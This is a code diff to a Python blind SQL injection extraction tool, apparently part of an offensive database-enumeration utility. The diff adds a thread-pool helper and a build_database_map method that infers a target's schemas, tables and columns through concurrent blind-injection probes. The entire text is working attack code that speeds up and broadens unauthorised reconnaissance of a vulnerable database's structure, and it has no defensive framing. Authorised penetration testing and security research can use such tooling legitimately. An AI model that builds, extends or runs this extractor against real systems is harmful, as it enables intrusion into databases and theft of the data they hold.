@@ -1,13 +1,19 @@
 from __future__ import annotations
 
 import time
+from collections.abc import Callable, Sequence
 from concurrent.futures import Future, ThreadPoolExecutor, as_completed
 from dataclasses import dataclass
+from typing import TypeVar
 
 from .client import HttpClient
 from .dialects import SqlDialect
-from .models import ExtractionJob, ProbeResult
+from .models import DatabaseMap, ExtractionJob, ProbeResult, Schema, Table
 from .oracle import ResponseOracle
+
+
+T = TypeVar("T")
+R = TypeVar("R")
 
 
 class CalibrationError(RuntimeError):
@@ -127,27 +133,30 @@ class BlindExtractor:
             characters.append(chr(low))
         return "".join(characters)
 
-    def extract_many(self, jobs: list[ExtractionJob]) -> dict[str, str]:
-        if not jobs:
-            return {}
-        workers = min(self.config.workers, len(jobs))
-        ordered_keys = [job.key for job in jobs]
-        values: dict[str, str] = {}
+    def _parallel_map(self, items: Sequence[T], function: Callable[[T], R]) -> list[R]:
+        if not items:
+            return []
+        workers = min(self.config.workers, len(items))
+        values: list[R | None] = [None] * len(items)
         with ThreadPoolExecutor(
             max_workers=workers, thread_name_prefix="blind-sqli"
         ) as executor:
-            futures: dict[Future[str], ExtractionJob] = {
-                executor.submit(self.extract_string, job.expression): job for job in jobs
+            futures: dict[Future[R], int] = {
+                executor.submit(function, item): index
+                for index, item in enumerate(items)
             }
             try:
                 for future in as_completed(futures):
-                    job = futures[future]
-                    values[job.key] = future.result()
+                    values[futures[future]] = future.result()
             except Exception:
                 for future in futures:
                     future.cancel()
                 raise
-        return {key: values[key] for key in ordered_keys}
+        return [value for value in values if value is not None]
+
+    def extract_many(self, jobs: list[ExtractionJob]) -> dict[str, str]:
+        values = self._parallel_map(jobs, lambda job: self.extract_string(job.expression))
+        return {job.key: value for job, value in zip(jobs, values, strict=True)}
 
     def enumerate_schemas(self) -> list[str]:
         count = self.infer_integer(
@@ -183,6 +192,81 @@ class BlindExtractor:
             for index in range(count)
         ]
         return list(self.extract_many(jobs).values())
+
+    def build_database_map(self, *, include_columns: bool = True) -> DatabaseMap:
+        """Build schema -> table -> column relationships with bounded concurrency.
+
+        Only one thread pool is active during each phase, avoiding nested executors while
+        still overlapping independent count and name extraction operations.
+        """
+
+        schema_names = self.enumerate_schemas()
+        database = DatabaseMap([Schema(name) for name in schema_names])
+        table_counts = self._parallel_map(
+            schema_names,
+            lambda schema: self.infer_integer(
+                self.dialect.table_count_expression(schema), self.config.max_items
+            ),
+        )
+
+        table_jobs: list[ExtractionJob] = []
+        table_locations: list[tuple[int, int]] = []
+        for schema_index, (schema_name, count) in enumerate(
+            zip(schema_names, table_counts, strict=True)
+        ):
+            for table_index in range(count):
+                table_jobs.append(
+                    ExtractionJob(
+                        f"s{schema_index}:t{table_index}",
+                        self.dialect.table_name_expression(schema_name, table_index),
+                    )
+                )
+                table_locations.append((schema_index, table_index))
+
+        table_names = list(self.extract_many(table_jobs).values())
+        for (schema_index, _), table_name in zip(
+            table_locations, table_names, strict=True
+        ):
+            database.schemas[schema_index].add_table(Table(table_name))
+
+        if not include_columns:
+            return database
+
+        table_references: list[tuple[int, int, str, str]] = []
+        for schema_index, schema in enumerate(database.schemas):
+            for table_index, table in enumerate(schema.tables):
+                table_references.append(
+                    (schema_index, table_index, schema.name, table.name)
+                )
+
+        column_counts = self._parallel_map(
+            table_references,
+            lambda item: self.infer_integer(
+                self.dialect.column_count_expression(item[2], item[3]),
+                self.config.max_items,
+            ),
+        )
+        column_jobs: list[ExtractionJob] = []
+        column_locations: list[tuple[int, int]] = []
+        for reference, count in zip(table_references, column_counts, strict=True):
+            schema_index, table_index, schema_name, table_name = reference
+            for column_index in range(count):
+                column_jobs.append(
+                    ExtractionJob(
+                        f"s{schema_index}:t{table_index}:c{column_index}",
+                        self.dialect.column_name_expression(
+                            schema_name, table_name, column_index
+                        ),
+                    )
+                )
+                column_locations.append((schema_index, table_index))
+
+        column_names = list(self.extract_many(column_jobs).values())
+        for (schema_index, table_index), column_name in zip(
+            column_locations, column_names, strict=True
+        ):
+            database.schemas[schema_index].tables[table_index].add_column(column_name)
+        return database
 
     @property
     def elapsed_seconds(self) -> float:
